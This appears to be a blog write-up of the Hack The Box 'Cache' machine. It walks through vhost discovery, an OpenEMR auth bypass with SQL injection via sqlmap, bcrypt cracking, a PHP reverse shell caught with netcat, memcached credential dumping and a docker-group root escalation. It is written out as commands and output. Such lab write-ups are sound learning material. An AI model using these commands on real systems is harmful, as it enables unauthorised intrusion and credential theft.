---
title: Hack the Box Cache Write-Up
tags: 
- writeup
- hackthebox
image: /images/cache/info.png
---

Let me just come clean and say that I needed a few hints from HTB forums to solve this one. Things like the /etc/hosts file and docker group were new to me. This box had some guesswork at the beginning too. But it was really fun once you knew what you had to do. The initial enumeration was definitely different from all the boxes I have rooted till now. There is not really anything else to say besides `sudo openvpn hackthebox.ovpn`
<!--more-->

<img src="/images/cache/info.png">

Starting the nmap scan
{%highlight text%}
nmap -Pn -T4 -A -sV -p- 10.10.10.188

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-08 18:28 IST
Nmap scan report for 10.10.10.188
Host is up (0.19s latency).

PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (EdDSA)
80/tcp   open   http         Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
3283/tcp closed netassistant
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{%endhighlight%}

This is also the first time that I have seen a SSH server but it wasn't used anywhere. Browsing to the webpage.

<img src="/images/cache/website.png" width="1000"/>

Alright so it says welcome to cache.htb but when I did a reverse DNS lookup I didn't find anything like that. Wierd...Moving on I just visit every section of the website and find a login page.

<img src="/images/cache/login.png" />

The thing that stood out to me was that the login page gave the output of my login attempts really fast. Almost as if the credentials were being checked on the client side? So I decide to read the source html and the javascript. Guess what I found?

<img src="/images/cache/javascript.png" />

We now have a username and a password in our notes. Next I try to login with these credentials but was faced with a " Site Under Construction".
Next I browse to the Author page and that gave me the next clue.

<img src="/images/cache/author.png" />

The author has also created a HMS(hospital management system). Somehow I feel like that the HMS was filled with security holes(*epic foreshadowing*). So I google HMS and do find a software named HMS but when I read it's documentation and tried to find it in the website I came up empty handed. I tried every combination and even inside directories found by Dirbuster. Nope... Nothing. 

At this point I knew that it I am dealing with something that I have no knowledge of. Heading on over to HTB forums...

I see someone say "virtual" and I think I know what he meant. I knew about virtual hosting but never faced it before. Wikipedia gives a pretty good [overview](https://en.wikipedia.org/wiki/Virtual_hosting) of it. There are 3 types of virtual hosting and I knew that it must be Name based because there were no other ports open for it to be Port based and we are obviously dealing with only a single IP so its not IP based either.

So I had to guess the name of the other website. There were strong hints about this one all over the cache.htb site. It said the creator made cache.htb and also HMS. So maybe something like HMS.htb? But when I tried it in firefox it said "Server Not found". But searching cache.htb also said the same thing even though it exists... So maybe I need a DNS? There were no DNS on the box. And after some googling I stumble upon something known as "/etc/hosts" file.

The hosts file inside /etc is something like a local DNS. Looking at man page of hosts we can see that it says that the file was used when there was no DNS in the past. All I need to do is enter a line like

`10.10.10.188  cache.htb`

Now I am able to browse to the webpage when I enter cache.htb. Now I try some different names for HMS. I get a hit.

`10.10.10.188  hms.htb`

<img src="/images/cache/openemr.png" width="1000"/>

This thing is screaming at me that there must be a CVE for it. I search for it and Yep... in terms of security it is more of a collander than a bowl. I had found a [gold mine](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf). Respect to the developers to not only point out all the vulnerabilities in their software but also give out walkthroughs and POCs too! 

But don't get too excited yet because we still haven't confirmed that the report is for the version that is running in the box. We see some information disclosure vulns too at /sql_patch.php. Browsing to the page we see

<img src="/images/cache/sqlpatch.png" />

Perfect that is the exact version we were looking for. Now that we have confirmation I go ahead and start reading the report line by line. there are 2 things that catch my attention.
1. An authentication bypass vulnerability.
2. There is an SQL injection that requires authentication but can be chained with the above vuln.

I also found [an exploit](https://www.exploit-db.com/exploits/48515) that results in a RCE but requires credentials to work. Now our plan of attack is complete.

Bypass authentication and perform the SQL injection. Get the creds from SQLi and then use the RCE exploit.

First we browse to `http://hms.htb/portal/account/register.php` and we are able to get a PHP session ID cookie without creds. Next we browse to `http://hms.htb/portal/fin_appt_popup_user.php?catid=1` because there is a SQLi vuln in the "catid" parameter and capture the request with burp so that we can copy the request and use it on another tool known as SQL map.

Using tools like SQL map, metasploit etc kill me from inside every I use them because a real hacker relies on his own skill, not some automated tool **dammit!** But right now my focus is on solving as many hackthebox machines as possible. I can learn SQL injection but that deviates me from my current goal. Currently I only know the basics of SQLi like `1' OR 1=1;--`. So I will need to swallow my pride and use SQL map this time.

I copy the contents of the captured request and save them to a file.

<img src="/images/cache/burp.png" />

Now I already know the name of the database from the information disclosure vuln from above. We can directly dump the name of all tables inside that database with something like `python sqlmap.py -r requestFile -D openemr --tables`

-r specifies the file in which the captured request is present, -D tells which database to use and --tables tells to enumerate the names of all the tables present inside that database.

{%highlight text%}
+----------------------------+
| array                      |
| addresses                  |
| amc_misc_data              |
| amendments                 |
| amendments_history         |
| ar_activity                |
| ar_session                 |
| audit_details              |
| audit_master               |
| automatic_notification     |
| background_services        |
| batchcom                   |
| billing                    |
| calendar_external          |
| categories                 |
| categories_seq             |
| categories_to_documents    |
| ccda                       |
| ccda_components            |
| ccda_field_mapping         |
| ccda_sections              |
| ccda_table_mapping         |
| chart_tracker              |

--snip--
{%endhighlight%}

we get a pretty long list of tables and I try to dump the contents of the one that I found interesting. I finally get a usefull one named "users_secure". So I dump its contents with `python sqlmap -r requestFile -D openemr -T users_secure --dump`

we get this

{%highlight text%}
Database: openemr
Table: users_secure
[1 entry]
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
| id | salt                           | password                                                     | username      | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1  | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | openemr_admin | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+

{%endhighlight%}

we have a username and a hash of a password now. For simple hashes I just use crackstation.net but for complex ones that use a salt I have to use hashcat. First I figure out the type of hash. I use the man page of hashcat and judging from the pattern I see it is a "bcrypt $2*$, Blowfish" hash with mode number 3200. All that is left is cracking, I use the rockyou.txt wordlist.

`hashcat -a 0 -m 3200 Filewiththehash rockyou.txt`

-a 0 tells to use wordlist type of attack, -m 3200 tells about the mode/type of hash , Filewiththehash is self-explainatory and last parameter is the wordlist.

we get the password "xxxxxx" and the user "openemr_admin". At first I was confused that why is the password censored? And turns out that I am a dumbass. The password was literally "xxxxxx".

Now that we have a set of credentials we can use the [exploit](https://www.exploit-db.com/exploits/48515) we found earlier. Replace all the "localhost" in the script with "hms.htb" and edit the credentials. The script is easy to understand. we just upload a php reverse shell and start a netcat listener. When we browse to the php shell we get a connection back.

{%highlight text%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from hms.htb 32876 received!
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:22:10 up  3:14,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
{%endhighlight%}

We are currently www-data so I browse to the /home direcotry and see 2 users ash and luffy. First lets spawn a better shell with `python3 -c 'import pty;pty.spawn("/bin/bash")`

Now we have a tty shell we can try to switch to the ash user using the credentials we found inside the javascript in the beginning. Fair enough the creds worked and now we can get the user flag. 

Something tells me that we will need to get the luffy user before we get root. Anyway I perform the usual checks like `sudo -l` which told me that user ash is not allowed to use sudo. Next I to find services which are listening. 

{%highlight text%}
netstat -aon
netstat -aon
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      1 10.10.10.188:55882      8.8.4.4:53              SYN_SENT    on (0.35/0/0)
tcp        0      0 10.10.10.188:60644      10.10.14.28:1111        ESTABLISHED off (0.00/0/0)
tcp        0      0 127.0.0.1:11211         127.0.0.1:55042         TIME_WAIT   timewait (35.35/0/0)
tcp        0      0 10.10.10.188:60702      10.10.14.28:1111        ESTABLISHED off (0.00/0/0)
tcp        0     14 10.10.10.188:32876      10.10.14.8:1234         ESTABLISHED on (0.81/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)

--snip--
{%endhighlight%}

I start googling all the port which have the word "LISTEN" in front of them. I find a service whose name resembles with the name of the box. The service is known as "Memcached". This service as the name suggests, stores all the data for database driven websites inside the RAM so that the data does not have to be retrieved again and again. I find how to enumerate/interact with this service and I do find [an article](https://www.hackingarticles.in/penetration-testing-on-memcached-server/).

Following along was pretty easy. Take a look.

{%highlight text%}
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
version
VERSION 1.5.6 Ubuntu
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
get user
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
{%endhighlight%}

Now we have the password for luffy too. Next stop root.

Again I try things like `sudo -l` and `netstat -aon` but no luck this time. I check the crontabs. I try to find SUID binaries but none of them had any entries on GTFO bins. So I finally transfer linPEAS and run it. I see a lot of docker in the output but I have no idea how to use docker for priv esc. At this point I have officially run out of ideas and had to head over to HTB forums yet again. I see people say that it is infact a GTFO bin for priv esc but I have already tried all of the SUIDs.

I search for linux priv esc methods and see something I didn't do before i.e check the groups that the user is part of.

{%highlight text%}
luffy@cache:/tmp$ id
id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
{%endhighlight%}

Huh.. we are in the docker group. It is time to finally search for docker priv esc and I finally get what they meant by GTFO bins. It had an [entry for docker](https://gtfobins.github.io/gtfobins/docker/) too which I didn't try at first. 

So I try the first method.

{%highlight text%}
luffy@cache:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: Temporary failure in name resolution.
See 'docker run --help'.
{%endhighlight%}

That... didn't really work. Whats wrong? It says that docker didn't find the image alpine. So is it not there? After some searching I find a command to list out all the docker images.

{%highlight text%}
luffy@cache:/tmp$ docker image ls
docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        11 months ago       64.2MB
{%endhighlight%}

Alright lets try replacing "alpine" with "ubuntu". And it worked!

{%highlight text%}
luffy@cache:/tmp$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# whoami
whoami
root
{%endhighlight%}

Learned a lot from yet another box. Docker, virtual hosts, memcached... much stuff that I didn't know about. After so much brainstorming I don't have enough brain cells left to write a proper ending so... See ya!
